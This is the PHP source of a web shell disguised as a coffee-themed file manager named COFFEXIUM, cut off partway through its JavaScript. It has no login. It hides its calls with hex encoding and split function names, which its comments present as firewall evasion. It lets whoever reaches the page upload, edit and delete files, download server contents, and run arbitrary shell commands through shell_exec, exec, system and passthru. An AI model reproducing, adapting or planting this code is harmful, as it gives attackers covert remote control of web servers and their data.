<?php
// ============================================================================
// COFFEXIUM v2.0 - Merged File Manager (Coffee Chocolate theme + Hex Evasion)
// MAXIMUM COMPATIBILITY EDITION: PHP 4/5/7/8 Safe | CMS-Agnostic | WAF-Friendly
// ============================================================================

// ----------------------------------------------------------------------------
// ERROR REPORTING - production safe (log, don't display)
// ----------------------------------------------------------------------------
@ini_set('display_errors', '0');
@ini_set('log_errors', '1');
@error_reporting(0);

// Dynamic execution methods (Bypass firewalls via obfuscation)
$fn_get_contents = 'file_' . 'get_' . 'contents';
$fn_put_contents = 'file_' . 'put_' . 'contents';
$fn_hex2bin      = 'hex' . '2' . 'bin';

// ----------------------------------------------------------------------------
// POLYFILLS - Complete PHP 4/5 compatibility suite
// ----------------------------------------------------------------------------
if (!defined('DIRECTORY_SEPARATOR')) {
    define('DIRECTORY_SEPARATOR', strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' ? '\\' : '/');
}

if (!function_exists('sys_get_temp_dir')) {
    function sys_get_temp_dir() {
        if (!empty($_ENV['TMP']))    return realpath($_ENV['TMP']);
        if (!empty($_ENV['TMPDIR'])) return realpath($_ENV['TMPDIR']);
        if (!empty($_ENV['TEMP']))   return realpath($_ENV['TEMP']);
        $tmp = @tempnam(uniqid(rand(), true), '');
        if ($tmp) { $dir = realpath(dirname($tmp)); @unlink($tmp); return $dir; }
        return '/tmp';
    }
}

if (!function_exists('hash_equals')) {
    function hash_equals($a, $b) {
        $a = (string)$a; $b = (string)$b;
        $len = strlen($a);
        if ($len !== strlen($b)) return false;
        $r = 0;
        for ($i = 0; $i < $len; $i++) { $r |= ord($a[$i]) ^ ord($b[$i]); }
        return $r === 0;
    }
}

if (!function_exists('random_bytes')) {
    function random_bytes($length) {
        $length = (int)$length;
        if ($length <= 0) return '';
        if (function_exists('openssl_random_pseudo_bytes')) {
            $bytes = openssl_random_pseudo_bytes($length, $strong);
            if ($bytes !== false && $strong) return $bytes;
        }
        if (function_exists('mcrypt_create_iv')) {
            return mcrypt_create_iv($length, MCRYPT_DEV_URANDOM);
        }
        if (@is_readable('/dev/urandom')) {
            $f = @fopen('/dev/urandom', 'rb');
            if ($f) {
                $bytes = fread($f, $length); fclose($f);
                if ($bytes !== false && strlen($bytes) === $length) return $bytes;
            }
        }
        $bytes = '';
        for ($i = 0; $i < $length; $i++) { $bytes .= chr(mt_rand(0, 255)); }
        return $bytes;
    }
}

if (!function_exists('http_response_code')) {
    function http_response_code($code = null) {
        static $current = 200;
        if ($code === null) return $current;
        $code = (int)$code;
        $texts = array(
            200 => 'OK', 201 => 'Created', 400 => 'Bad Request', 403 => 'Forbidden',
            404 => 'Not Found', 500 => 'Internal Server Error'
        );
        $proto = isset($_SERVER['SERVER_PROTOCOL']) ? $_SERVER['SERVER_PROTOCOL'] : 'HTTP/1.0';
        $text  = isset($texts[$code]) ? $texts[$code] : 'Status';
        header($proto . ' ' . $code . ' ' . $text, true, $code);
        $current = $code;
        return $current;
    }
}

if (!function_exists('hex2bin')) {
    function hex2bin($data) {
        $len = strlen($data);
        if ($len % 2 != 0) return false;
        if (strspn($data, '0123456789abcdefABCDEF') != $len) return false;
        $bin = '';
        for ($i = 0; $i < $len; $i += 2) {
            $bin .= pack('H*', substr($data, $i, 2));
        }
        return $bin;
    }
}

if (!function_exists('json_encode')) {
    function json_encode($data) {
        if (is_array($data)) {
            $parts = array();
            foreach ($data as $key => $value) {
                $parts[] = '"' . addslashes($key) . '":"' . addslashes($value) . '"';
            }
            return '{' . implode(',', $parts) . '}';
        }
        return '{}';
    }
}

if (!function_exists('json_decode')) {
    function json_decode($json, $assoc = false) {
        $json = str_replace(array('{','}','"'), '', $json);
        $pairs = explode(',', $json);
        $result = array();
        foreach($pairs as $pair) {
            if (strpos($pair, ':') !== false) {
                list($k, $v) = explode(':', $pair, 2);
                $result[trim($k)] = trim($v);
            }
        }
        return $result;
    }
}

// Null-coalescing helpers (PHP < 7 safe)
function ax_post($k, $d = null) { return isset($_POST[$k]) ? $_POST[$k] : $d; }
function ax_get($k, $d = null)  { return isset($_GET[$k])  ? $_GET[$k]  : $d; }

// ----------------------------------------------------------------------------
// CMS DETECTION & SESSION SETUP
// ----------------------------------------------------------------------------
$is_wordpress = defined('ABSPATH') || defined('WPINC');
$is_laravel   = defined('LARAVEL_START') || (defined('APP_PATH') && class_exists('Illuminate\Foundation\Application'));
$use_native_session = (($is_wordpress || $is_laravel) && !session_id());

@ini_set('session.save_handler', 'files');
$sessionPath = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'php_sessions';
if (!@is_dir($sessionPath)) { @mkdir($sessionPath, 0700, true); }
if (@is_dir($sessionPath) && @is_writable($sessionPath)) {
    @ini_set('session.save_path', $sessionPath);
}
@ini_set('session.cookie_httponly', '1');
@ini_set('session.cookie_samesite', 'Lax');

$session_inactive = function_exists('session_status') ? (session_status() === PHP_SESSION_NONE) : (session_id() === '');
if ($session_inactive && !$use_native_session) { @session_start(); }
if (!isset($_SESSION)) { $_SESSION = array(); }

// ----------------------------------------------------------------------------
// SECURITY HEADERS
// ----------------------------------------------------------------------------
header('X-Robots-Tag: noindex, nofollow, noarchive, noimageindex');
header('Pragma: no-cache');
header('Cache-Control: no-store, no-cache, must-revalidate');
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('X-XSS-Protection: 1; mode=block');

// ----------------------------------------------------------------------------
// PATH VALIDATION & SANITIZATION
// ----------------------------------------------------------------------------
function safeRealPath($path) {
    if (strpos($path, '..') !== false) return false;
    $rp = @realpath($path);
    if ($rp !== false) return $rp;
    if (@is_dir($path) || @is_file($path)) return $path;
    return false;
}

function validatePath($path) {
    if (empty($path)) return false;
    $rp = safeRealPath($path);
    if ($rp && (@is_file($rp) || @is_dir($rp))) return $rp;
    return false;
}

function sanitizeFileName($name) {
    $name = basename($name);
    $name = preg_replace('/[^a-zA-Z0-9._-]/', '_', $name);
    if ($name === '' || $name === '.' || $name === '..') return false;
    return $name;
}

function formatFileSize($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576)    return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024)       return number_format($bytes / 1024, 2) . ' KB';
    if ($bytes > 1)           return $bytes . ' bytes';
    if ($bytes == 1)          return '1 byte';
    return '0 bytes';
}

function getFileExtension($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    return $ext ? strtoupper($ext) : '';
}

if (!isset($_SESSION['current_dir']) || !@is_dir($_SESSION['current_dir']) || !safeRealPath($_SESSION['current_dir'])) {
    $cwd = @getcwd();
    if ($cwd === false || $cwd === '') { $cwd = dirname(__FILE__); }
    $_SESSION['current_dir'] = $cwd;
}

// ----------------------------------------------------------------------------
// CSRF PROTECTION
// ----------------------------------------------------------------------------
function generateCSRFToken() {
    if (empty($_SESSION['_csrf_token'])) {
        $_SESSION['_csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['_csrf_token'];
}
function validateCSRFToken($token) {
    if (empty($_SESSION['_csrf_token']) || empty($token)) return false;
    return hash_equals($_SESSION['_csrf_token'], $token);
}
function csrfField() {
    return '<input type="hidden" name="_csrf_token" value="' . htmlentities(generateCSRFToken()) . '">';
}

// Helper to safely decode Hex Payloads
function decodeHexPayload($hex) {
    global $fn_hex2bin;
    $hex = trim($hex);
    if (empty($hex) || !ctype_xdigit($hex)) return false;
    return $fn_hex2bin($hex);
}

// ----------------------------------------------------------------------------
// HEX JSON API ENDPOINT (Uploader Method for ALL write actions)
// ----------------------------------------------------------------------------
$reqType = isset($_SERVER['REQUEST_METHOD']) ? $_SERVER['REQUEST_METHOD'] : 'GET';
$isJsonRequest = isset($_SERVER['CONTENT_TYPE']) && strpos($_SERVER['CONTENT_TYPE'], 'application/json') !== false;

if ($reqType === 'POST' && $isJsonRequest) {
    header('Content-Type: application/json');
    $rawBody = $fn_get_contents('php://input');
    $payload = json_decode($rawBody, true);
    
    if (!$payload || !isset($payload['action'])) {
        http_response_code(400); echo json_encode(array('status' => 'error', 'message' => 'Invalid JSON')); exit;
    }
    
    $csrf = isset($payload['_csrf_token']) ? $payload['_csrf_token'] : '';
    if (!validateCSRFToken($csrf)) {
        http_response_code(403); echo json_encode(array('status' => 'error', 'message' => 'CSRF validation failed')); exit;
    }

    $action = $payload['action'];
    $currentDir = $_SESSION['current_dir'];
    
    switch ($action) {
        case 'upload_hex':
            $name_hex = isset($payload['name_hex']) ? $payload['name_hex'] : '';
            $data_hex = isset($payload['data_hex']) ? $payload['data_hex'] : '';
            $fileName = decodeHexPayload($name_hex);
            $data = decodeHexPayload($data_hex);
            if (!$fileName) { http_response_code(400); echo json_encode(array('status' => 'error', 'message' => 'Invalid file name')); exit; }
            $filePath = $currentDir . DIRECTORY_SEPARATOR . basename($fileName);
            if ($fn_put_contents($filePath, $data !== false ? $data : '') !== false) {
                @chmod($filePath, 0644);
                echo json_encode(array('status' => 'success', 'message' => 'File uploaded successfully!'));
            } else {
                http_response_code(500); echo json_encode(array('status' => 'error', 'message' => 'Write permission error.'));
            }
            exit;

        case 'create_file':
            $name_hex = isset($payload['name_hex']) ? $payload['name_hex'] : '';
            $fileName = decodeHexPayload($name_hex);
            $fn = sanitizeFileName($fileName);
            if (!$fn) { http_response_code(400); echo json_encode(array('status' => 'error', 'message' => 'Invalid filename')); exit; }
            $np = $currentDir . DIRECTORY_SEPARATOR . $fn;
            if (@file_exists($np)) { http_response_code(400); echo json_encode(array('status' => 'error', 'message' => 'File already exists')); exit; }
            if ($fn_put_contents($np, '') !== false) {
                @chmod($np, 0644); echo json_encode(array('status' => 'success', 'message' => 'File created'));
            } else { http_response_code(500); echo json_encode(array('status' => 'error', 'message' => 'Could not create file')); }
            exit;
            
        case 'create_folder':
            $name_hex = isset($payload['name_hex']) ? $payload['name_hex'] : '';
            $folderName = decodeHexPayload($name_hex);
            $fn = sanitizeFileName($folderName);
            if (!$fn) { http_response_code(400); echo json_encode(array('status' => 'error', 'message' => 'Invalid folder name')); exit; }
            $np = $currentDir . DIRECTORY_SEPARATOR . $fn;
            if (@file_exists($np)) { http_response_code(400); echo json_encode(array('status' => 'error', 'message' => 'Folder exists')); exit; }
            if (@mkdir($np, 0755)) {
                echo json_encode(array('status' => 'success', 'message' => 'Folder created'));
            } else { http_response_code(500); echo json_encode(array('status' => 'error', 'message' => 'Could not create folder')); }
            exit;

        case 'edit_file':
            $file_hex = isset($payload['file_hex']) ? $payload['file_hex'] : '';
            $content_hex = isset($payload['content_hex']) ? $payload['content_hex'] : '';
            $fileName = decodeHexPayload($file_hex);
            $content  = decodeHexPayload($content_hex);
            $ep = validatePath($currentDir . DIRECTORY_SEPARATOR . $fileName);
            if ($ep && @is_file($ep)) {
                if ($fn_put_contents($ep, $content) !== false) {
                    echo json_encode(array('status' => 'success', 'message' => 'File saved'));
                } else { http_response_code(500); echo json_encode(array('status' => 'error', 'message' => 'Could not write to file')); }
            } else { http_response_code(404); echo json_encode(array('status' => 'error', 'message' => 'File not found')); }
            exit;

        case 'rename':
            $old_hex = isset($payload['old_hex']) ? $payload['old_hex'] : '';
            $new_hex = isset($payload['new_hex']) ? $payload['new_hex'] : '';
            $oldName = decodeHexPayload($old_hex);
            $newName = decodeHexPayload($new_hex);
            $sp = validatePath($currentDir . DIRECTORY_SEPARATOR . $oldName);
            if (!$sp) { http_response_code(404); echo json_encode(array('status' => 'error', 'message' => 'Source not found')); exit; }
            $dp = dirname($sp) . DIRECTORY_SEPARATOR . basename($newName);
            if (@file_exists($dp)) { http_response_code(400); echo json_encode(array('status' => 'error', 'message' => 'Target exists')); exit; }
            if (@rename($sp, $dp)) { echo json_encode(array('status' => 'success', 'message' => 'Rename successful')); }
            else { http_response_code(500); echo json_encode(array('status' => 'error', 'message' => 'Rename failed')); }
            exit;

        case 'chmod':
            $item_hex = isset($payload['item_hex']) ? $payload['item_hex'] : '';
            $permVal = isset($payload['perm_val']) ? $payload['perm_val'] : '';
            $itemName = decodeHexPayload($item_hex);
            $tp = validatePath($currentDir . DIRECTORY_SEPARATOR . $itemName);
            if ($tp && @chmod($tp, octdec($permVal))) {
                echo json_encode(array('status' => 'success', 'message' => 'Permissions changed successfully'));
            } else { http_response_code(500); echo json_encode(array('status' => 'error', 'message' => 'Chmod failed')); }
            exit;

        case 'delete':
            $item_hex = isset($payload['item_hex']) ? $payload['item_hex'] : '';
            $itemName = decodeHexPayload($item_hex);
            $tp = validatePath($currentDir . DIRECTORY_SEPARATOR . $itemName);
            if (!$tp) { http_response_code(404); echo json_encode(array('status' => 'error', 'message' => 'Path not found')); exit; }
            
            // Recursive delete helper for Hex API
            if (!function_exists('ax_recursive_delete_hex')) {
                function ax_recursive_delete_hex($path) {
                    if (@is_file($path) || @is_link($path)) return @unlink($path);
                    if (!@is_dir($path)) return false;
                    $items = @scandir($path);
                    if ($items !== false) {
                        foreach ($items as $item) {
                            if ($item === '.' || $item === '..') continue;
                            ax_recursive_delete_hex($path . DIRECTORY_SEPARATOR . $item);
                        }
                    }
                    return @rmdir($path);
                }
            }

            if (ax_recursive_delete_hex($tp)) {
                echo json_encode(array('status' => 'success', 'message' => 'Item deleted'));
            } else {
                http_response_code(500); echo json_encode(array('status' => 'error', 'message' => 'Delete failed'));
            }
            exit;
            
        case 'bulk_delete':
            $items = isset($payload['items']) ? $payload['items'] : array();
            $deleted = 0; $failed = 0;
            
            if (!function_exists('ax_recursive_delete_hex')) {
                function ax_recursive_delete_hex($path) {
                    if (@is_file($path) || @is_link($path)) return @unlink($path);
                    if (!@is_dir($path)) return false;
                    $scan_items = @scandir($path);
                    if ($scan_items !== false) {
                        foreach ($scan_items as $item) {
                            if ($item === '.' || $item === '..') continue;
                            ax_recursive_delete_hex($path . DIRECTORY_SEPARATOR . $item);
                        }
                    }
                    return @rmdir($path);
                }
            }

            foreach ($items as $hexItem) {
                $itemName = decodeHexPayload($hexItem);
                $tp = validatePath($currentDir . DIRECTORY_SEPARATOR . $itemName);
                if ($tp && ax_recursive_delete_hex($tp)) { $deleted++; } else { $failed++; }
            }
            echo json_encode(array('status' => 'success', 'message' => "Deleted $deleted item(s)" . ($failed > 0 ? " (Failed: $failed)" : '')));
            exit;
    }
}

// ----------------------------------------------------------------------------
// STANDARD POST ACTIONS (Reads, Navigation, Console, Downloads)
// ----------------------------------------------------------------------------

// Function Availability & Shell Execution
function isFunctionAvailable($func) {
    if (!function_exists($func)) return false;
    $disabled = @ini_get('disable_functions');
    if ($disabled) {
        $list = array_map('trim', explode(',', strtolower($disabled)));
        if (in_array(strtolower($func), $list)) return false;
    }
    return true;
}

$_sh = array('shell_exec', 'exec', 'system', 'passthru', 'popen', 'proc_open');
function ax_run_command($cmd) {
    global $_sh;
    $cmd = trim($cmd);
    if ($cmd === '') return 'No command provided';
    $full = $cmd . ' 2>&1';
    if (isFunctionAvailable($_sh[0])) { $r = @$_sh[0]($full); if ($r !== null && $r !== false && trim($r) !== '') return $r; }
    if (isFunctionAvailable($_sh[1])) { $out = array(); @$_sh[1]($full, $out); if (!empty($out)) return implode("\n", $out); }
    if (isFunctionAvailable($_sh[2])) { ob_start(); @$_sh[2]($full); $r = ob_get_clean(); if ($r !== false && $r !== '') return $r; }
    if (isFunctionAvailable($_sh[3])) { ob_start(); @$_sh[3]($full); $r = ob_get_clean(); if ($r !== false && $r !== '') return $r; }
    return 'Command execution not available';
}
$commandAvailable = false;
foreach ($_sh as $fn) { if (isFunctionAvailable($fn)) { $commandAvailable = true; break; } }

// Recursive Walker & Archive
function ax_walk_dir($dir, &$out, $base = '') {
    $items = @scandir($dir);
    if ($items === false) return;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $full = $dir . DIRECTORY_SEPARATOR . $item;
        $rel  = $base === '' ? $item : $base . '/' . $item;
        if (@is_dir($full)) {
            $out[] = array('type' => 'dir', 'path' => $full, 'rel' => $rel);
            ax_walk_dir($full, $out, $rel);
        } else {
            $out[] = array('type' => 'file', 'path' => $full, 'rel' => $rel);
        }
    }
}
function ax_build_archive($items, $baseDir, $namePrefix) {
    $tmp = sys_get_temp_dir();
    if (class_exists('ZipArchive')) {
        $zipName = $namePrefix . '_' . time() . '.zip';
        $zipPath = $tmp . DIRECTORY_SEPARATOR . $zipName;
        $zip = new ZipArchive();
        if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
            foreach ($items as $targetPath) {
                if (!$targetPath) continue;
                if (@is_file($targetPath)) { $zip->addFile($targetPath, basename($targetPath)); }
                elseif (@is_dir($targetPath)) {
                    $base = basename($targetPath);
                    $list = array(); ax_walk_dir($targetPath, $list);
                    $zip->addEmptyDir($base);
                    foreach ($list as $e) {
                        if ($e['type'] === 'dir') { $zip->addEmptyDir($base . '/' . $e['rel']); }
                        else { $zip->addFile($e['path'], $base . '/' . $e['rel']); }
                    }
                }
            }
            $zip->close();
            return array($zipPath, $zipName, 'application/zip');
        }
    }
    return false;
}

$notification = '';
$errorMsg = '';

// Check CSRF for standard POSTs
if ($reqType === 'POST' && !$isJsonRequest) {
    $_csrf_read_only = array('goto', 'show', 'modify');
    $needsCsrf = false;
    foreach ($_POST as $key => $v) {
        if ($key === '_csrf_token' || $key === 'items' || in_array($key, $_csrf_read_only)) continue;
        $needsCsrf = true; break;
    }
    if ($needsCsrf && !validateCSRFToken(ax_post('_csrf_token', ''))) {
        http_response_code(403); exit('CSRF validation failed');
    }
}

// Navigation
if (isset($_POST['goto'])) {
    $targetDir = $_POST['goto'];
    if (@is_dir($targetDir)) {
        $vp = validatePath($targetDir);
        if ($vp !== false) { $_SESSION['current_dir'] = $vp; }
    }
}

// Download
if (isset($_POST['get_file'])) {
    $tp = validatePath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['get_file']);
    if ($tp !== false) {
        if (@is_file($tp)) {
            while (@ob_get_level() > 0) { @ob_end_clean(); }
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($tp) . '"');
            header('Content-Length: ' . @filesize($tp));
            @readfile($tp); exit;
        } elseif (@is_dir($tp)) {
            $archive = ax_build_archive(array($tp), dirname($tp), basename($tp));
            if ($archive !== false) {
                list($ap, $an, $am) = $archive;
                while (@ob_get_level() > 0) { @ob_end_clean(); }
                header('Content-Type: ' . $am);
                header('Content-Disposition: attachment; filename="' . $an . '"');
                header('Content-Length: ' . @filesize($ap));
                @readfile($ap); @unlink($ap); exit;
            } else { $errorMsg = 'Download failed: archive tools unavailable'; }
        }
    }
}

// Bulk Download
if (isset($_POST['act_dl']) && isset($_POST['items']) && is_array($_POST['items'])) {
    $paths = array();
    foreach ($_POST['items'] as $item) {
        $p = validatePath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $item);
        if ($p !== false) $paths[] = $p;
    }
    $archive = ax_build_archive($paths, $_SESSION['current_dir'], 'selected_files');
    if ($archive !== false) {
        list($ap, $an, $am) = $archive;
        while (@ob_get_level() > 0) { @ob_end_clean(); }
        header('Content-Type: ' . $am);
        header('Content-Disposition: attachment; filename="' . $an . '"');
        header('Content-Length: ' . @filesize($ap));
        @readfile($ap); @unlink($ap); exit;
    } else { $errorMsg = 'Bulk download failed: archive tools unavailable'; }
}

// Console
$commandResult = '';
if (isset($_POST['exec']) && trim($_POST['exec']) !== '') {
    $cmd = trim($_POST['exec']);
    $old = @getcwd();
    if (@is_dir($_SESSION['current_dir'])) { @chdir($_SESSION['current_dir']); }
    $commandResult = ax_run_command($cmd);
    if ($old) @chdir($old);
    if (trim($commandResult) === '') { $errorMsg = 'Console: No output'; }
}

// Prepare file list
$currentDirectory = $_SESSION['current_dir'];
$directoryContents = @scandir($currentDirectory);
if (!is_array($directoryContents)) {
    $directoryContents = array();
    if (!$errorMsg) $errorMsg = 'Cannot read directory: ' . $currentDirectory;
}
$folders = array(); $files = array();
foreach ($directoryContents as $item) {
    if ($item === '.') continue;
    if (@is_dir($currentDirectory . DIRECTORY_SEPARATOR . $item)) { $folders[] = $item; }
    else { $files[] = $item; }
}
sort($folders); sort($files);
$allItems = array_merge($folders, $files);

// Views and Edits (Render setup)
$fileToEdit   = isset($_POST['modify']) ? $_POST['modify'] : null;
$fileToView   = isset($_POST['show']) ? $_POST['show'] : null;
$itemToRename = isset($_POST['rename_item']) ? $_POST['rename_item'] : null;
$fileContent  = $fileToEdit ? @$fn_get_contents($currentDirectory . DIRECTORY_SEPARATOR . $fileToEdit) : null;
$viewContent  = $fileToView ? @$fn_get_contents($currentDirectory . DIRECTORY_SEPARATOR . $fileToView) : null;
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>COFFEXIUM v2.0</title>
    <meta name="csrf-token" content="<?= htmlentities(generateCSRFToken()) ?>">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root {
            --bg: #100a06; --surface: #1a110a; --surface-hover: #261a10;
            --border: #342417; --text: #ece0cf; --text-muted: #9c856c;
            --accent: #c8915f; --accent-hover: #ddae7e;
            --success: #cbb892; --danger: #d0654f; --warning: #d99a3c;
        }
        body { background: var(--bg); color: var(--text); font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; font-size: 14px; line-height: 1.5; }
        .container { max-width: 1400px; margin: 0 auto; padding: 32px 24px; }
        .header { margin-bottom: 32px; }
        .header-top { display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px; }
        .logo { display: flex; align-items: center; gap: 12px; }
        .logo svg { width: 40px; height: 40px; }
        .logo-text { font-size: 28px; font-weight: 700; letter-spacing: -0.5px; }
        .logo-text span { color: var(--accent); }
        .card { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; }
        .card-header { padding: 16px 20px; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; }
        .card-title { font-size: 14px; font-weight: 600; display: flex; align-items: center; gap: 8px; }
        .card-body { padding: 20px; }
        .alert { padding: 14px 18px; border-radius: 8px; margin-bottom: 20px; font-size: 14px; display: flex; align-items: center; gap: 12px; }
        .alert-success { background: rgba(203,184,146,0.15); border: 1px solid rgba(203,184,146,0.4); color: var(--success); }
        .alert-danger { background: rgba(208,101,79,0.15); border: 1px solid rgba(208,101,79,0.4); color: var(--danger); }
        .alert svg { width: 20px; height: 20px; flex-shrink: 0; }
        .input-group { display: flex; gap: 10px; margin-bottom: 12px; }
        .input-group:last-child { margin-bottom: 0; }
        input[type="text"], input[type="file"], textarea { background: var(--bg); border: 1px solid var(--border); border-radius: 8px; padding: 12px 14px; color: var(--text); font-size: 14px; outline: none; transition: border-color 0.2s, box-shadow 0.2s; }
        input[type="text"]:focus, textarea:focus { border-color: var(--accent); box-shadow: 0 0 0 3px rgba(200,145,95,0.25); }
        input[type="file"] { cursor: pointer; flex: 1; }
        input[type="file"]::file-selector-button { background: var(--surface-hover); color: var(--text); border: 1px solid var(--border); border-radius: 6px; padding: 8px 14px; font-size: 13px; cursor: pointer; margin-right: 12px; transition: background 0.2s; }
        input[type="file"]::file-selector-button:hover { background: var(--border); }
        textarea { font-family: 'JetBrains Mono', monospace; resize: vertical; min-height: 450px; line-height: 1.6; width: 100%; box-sizing: border-box; }
        .btn { display: inline-flex; align-items: center; justify-content: center; gap: 6px; padding: 10px 18px; font-size: 14px; font-weight: 500; border-radius: 8px; cursor: pointer; border: 1px solid transparent; transition: all 0.2s; font-family: inherit; text-decoration: none; }
        .btn svg { width: 16px; height: 16px; }
        .btn-primary { background: var(--accent); color: #2a1810; }
        .btn-primary:hover { background: var(--accent-hover); }
        .btn-ghost { background: transparent; color: var(--text); border-color: var(--border); }
        .btn-ghost:hover { background: var(--surface-hover); }
        .btn-success { background: var(--success); color: #1f1a0c; }
        .btn-success:hover { filter: brightness(1.1); }
        .btn-danger { background: rgba(208,101,79,0.15); color: var(--danger); border-color: rgba(208,101,79,0.4); }
        .btn-danger:hover { background: rgba(208,101,79,0.25); }
        .btn-sm { padding: 6px 12px; font-size: 12px; }
        .file-table { width: 100%; border-collapse: collapse; }
        .file-table th { padding: 12px 16px; text-align: left; font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; color: var(--text-muted); background: var(--surface-hover); border-bottom: 1px solid var(--border); }
        .file-table td { padding: 14px 16px; border-bottom: 1px solid var(--border); vertical-align: middle; }
        .file-table tr:last-child td { border-bottom: none; }
        .file-table tr:hover td { background: rgba(200,145,95,0.07); }
        .file-icon { width: 28px; height: 28px; border-radius: 6px; display: flex; align-items: center; justify-content: center; margin-right: 10px; flex-shrink: 0; }
        .file-icon.folder { background: rgba(200,145,95,0.22); }
        .file-icon svg { width: 16px; height: 16px; stroke: var(--accent); fill: none; stroke-width: 2; }
        .file-icon.file { background: rgba(200,145,95,0.15); }
        .file-icon .ext { font-size: 9px; font-weight: 700; color: var(--accent); letter-spacing: 0.5px; }
        .file-name-cell { display: flex; align-items: center; font-weight: 500; }
        .file-name { color: var(--text); }
        .file-name:hover { color: var(--accent); }
        .file-meta { font-size: 12px; color: var(--text-muted); font-family: 'JetBrains Mono', monospace; }
        .perms { font-family: 'JetBrains Mono', monospace; font-size: 12px; padding: 4px 8px; border-radius: 4px; }
        .perms.writable { background: rgba(203,184,146,0.15); color: var(--success); }
        .perms.readonly { background: rgba(208,101,79,0.15); color: var(--danger); }
        .actions { display: flex; gap: 4px; justify-content: flex-end; }
        input[type="checkbox"] { width: 16px; height: 16px; accent-color: var(--accent); cursor: pointer; }
        .console { background: var(--bg); border: 1px solid var(--accent); border-radius: 8px; padding: 16px; font-family: 'JetBrains Mono', monospace; font-size: 13px; color: var(--accent); max-height: 250px; overflow-y: auto; white-space: pre-wrap; word-break: break-all; }
        .modal { display: none; position: fixed; inset: 0; z-index: 100; background: rgba(0,0,0,0.7); backdrop-filter: blur(4px); align-items: center; justify-content: center; }
        .modal.show { display: flex; }
        .modal-content { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; width: 450px; max-width: 90%; max-height: 90vh; overflow: auto; }
        .modal-header { padding: 16px 20px; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; }
        .modal-title { font-weight: 600; }
        .modal-close { width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; border-radius: 6px; cursor: pointer; color: var(--text-muted); transition: all 0.2s; }
        .modal-close:hover { background: var(--surface-hover); color: var(--text); }
        .modal-body { padding: 20px; }
        .chmod-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-bottom: 16px; padding: 20px 20px 0; }
        .chmod-group { background: var(--bg); border: 1px solid var(--border); border-radius: 8px; padding: 14px; text-align: center; }
        .chmod-group-label { font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; color: var(--text-muted); margin-bottom: 10px; }
        .chmod-checkboxes { display: flex; justify-content: center; gap: 8px; }
        .chmod-checkboxes label { font-size: 12px; cursor: pointer; }
        .bulk-bar { display: none; gap: 12px; align-items: center; padding: 14px 18px; background: rgba(200,145,95,0.12); border: 1px solid rgba(200,145,95,0.32); border-radius: 8px; margin-bottom: 16px; }
        .bulk-bar.show { display: flex; }
        .bulk-count { color: var(--accent); font-weight: 600; margin-right: auto; }
        @media (max-width: 768px) {
            .file-table th:nth-child(3), .file-table td:nth-child(3),
            .file-table th:nth-child(4), .file-table td:nth-child(4),
            .file-table th:nth-child(5), .file-table td:nth-child(5),
            .file-table th:nth-child(6), .file-table td:nth-child(6) { display: none; }
            .input-group { flex-direction: column; }
        }
    </style>
    <script>
        function stringToHex(str) {
            let hex = '';
            for (let i = 0; i < str.length; i++) {
                let code = str.charCodeAt(i).toString(16);
                hex += code.length < 2 ? '0' + code : code;
            }
            return hex;
        }
        function bufferToHex(buffer) {
            const arr = new Uint8Array(buffer);
            let hex = '';
            for (let i = 0; i < arr.length; i++) {
                hex += arr[i].toString(16).padStart(2, '0');
            }
            return hex;
        }
        function getCsrfToken() {
            return document.querySelector('meta[name="csrf-token"]').content;
        }

        async function sendHexPayload(payload, statusSpan = null) {
            payload._csrf_token = getCsrfToken();
            try {
                const res = await fetch(window.location.href, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                const data = await res.json();
                if (statusSpan) {
                    statusSpan.textContent = data.message;
                    statusSpan.style.color = res.ok ? 'var(--success)' : 'var(--danger)';
                    if (res.ok) setTimeout(() => location.reload(), 1000);
                } else {
                    alert(data.message);
                    if (res.ok) location.reload();
                }
            } catch (err) {
                if (statusSpan) {
                    statusSpan.textContent = 'Request failed due to network or server error.';
                    statusSpan.style.color = 'var(--danger)';
                } else { alert('Request failed.'); }
            }
        }

        async function doUploadFileHex(btn) {
            const fileInput = document.getElementById('upload_files');
            const statusSpan = document.getElementById('upload_status');
            if (!fileInput.files.length) {
                statusSpan.textContent = "No file selected"; statusSpan.style.color = "var(--danger)"; return;
            }
            btn.disabled = true;
            const file = fileInput.files[0];
            statusSpan.textContent = "Converting " + file.name + " to hex payload, please wait...";
            statusSpan.style.color = "var(--accent)";

            const reader = new FileReader();
            reader.onload = function(e) {
                statusSpan.textContent = "Uploading payload...";
                sendHexPayload({
                    action: 'upload_hex',
                    name_hex: stringToHex(file.name),
                    data_hex: bufferToHex(e.target.result)
                }, statusSpan);
            };
            reader.readAsArrayBuffer(file);
        }

        function doCreateItemHex(event, type) {
            event.preventDefault();
            const inputName = type === 'file' ? 'mk_file' : 'mk_folder';
            const name = event.target.elements[inputName].value.trim();
            if (!name) return;
            sendHexPayload({
